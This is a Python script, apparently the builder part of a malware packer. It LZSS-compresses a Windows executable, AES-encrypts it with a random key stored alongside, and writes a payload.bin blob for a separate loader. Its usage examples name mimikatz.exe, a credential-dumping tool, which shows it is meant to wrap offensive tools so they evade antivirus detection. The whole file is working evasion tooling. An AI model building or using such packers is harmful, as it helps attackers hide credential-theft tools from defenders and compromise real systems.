#!/usr/bin/env python3
import sys
import os
import hashlib
import struct
from os import urandom
from Crypto.Cipher import AES

def AESencrypt(plaintext, key):
    pad_len = 16 - (len(plaintext) % 16)
    if pad_len == 0:
        pad_len = 16
    plaintext += bytes([pad_len]) * pad_len
    k = hashlib.sha256(key).digest()
    iv = b'\x00' * 16
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(plaintext)

def change_ext(filename, new_ext):
    """Reemplaza la extensión del archivo por una nueva (sin el punto)."""
    base = os.path.splitext(filename)[0]
    return base + '.' + new_ext.lstrip('.')

def main():
    if len(sys.argv) not in (2, 3):
        print(f"Usage: {sys.argv[0]} <original_pe.exe> [compressed.lzss]")
        print("  - If only PE is given, auto-generate <PE>.lzss using ./pack")
        print("Example 1: python3 build_payload.py mimikatz.exe")
        print("Example 2: python3 build_payload.py mimikatz.exe custom.lzss")
        sys.exit(1)

    pe_path = sys.argv[1]

    if len(sys.argv) == 2:
        # Auto-generar nombre .lzss
        lzss_path = change_ext(pe_path, "lzss")
        print(f"[+] Auto-generated LZSS path: {lzss_path}")

        # Comprimir con ./pack
        print(f"[+] Compressing '{pe_path}' -> '{lzss_path}' using ./pack...")
        ret = os.system(f"./pack \"{pe_path}\" \"{lzss_path}\"")
        if ret != 0:
            print("[-] Error: ./pack failed. Make sure 'pack' exists and is executable.")
            sys.exit(1)
    else:
        lzss_path = sys.argv[2]
        print(f"[+] Using provided LZSS file: {lzss_path}")

    output_path = "payload.bin"

    # Leer tamaño del PE original
    try:
        with open(pe_path, "rb") as f:
            pe_data = f.read()
        pe_original_size = len(pe_data)
    except Exception as e:
        print(f"[-] Error reading PE file '{pe_path}': {e}")
        sys.exit(1)

    # Leer LZSS
    try:
        with open(lzss_path, "rb") as f:
            lzss_data = f.read()
        if not lzss_data:
            print("[-] LZSS file is empty!")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading LZSS file '{lzss_path}': {e}")
        sys.exit(1)

    # Cifrar
    key = urandom(16)
    ciphertext = AESencrypt(lzss_data, key)

    # Empaquetar
    payload = (
        struct.pack("<I", len(key)) +
        key +
        struct.pack("<I", pe_original_size) +
        struct.pack("<I", len(ciphertext)) +
        ciphertext
    )

    # Guardar
    try:
        with open(output_path, "wb") as f:
            f.write(payload)
    except Exception as e:
        print(f"[-] Failed to write '{output_path}': {e}")
        sys.exit(1)

    print(f"\n[+] PE size:        {pe_original_size} bytes")
    print(f"[+] LZSS size:      {len(lzss_data)} bytes")
    print(f"[+] Ciphertext:     {len(ciphertext)} bytes")
    print(f"[+] Payload saved:  {output_path}")

if __name__ == "__main__":
    main()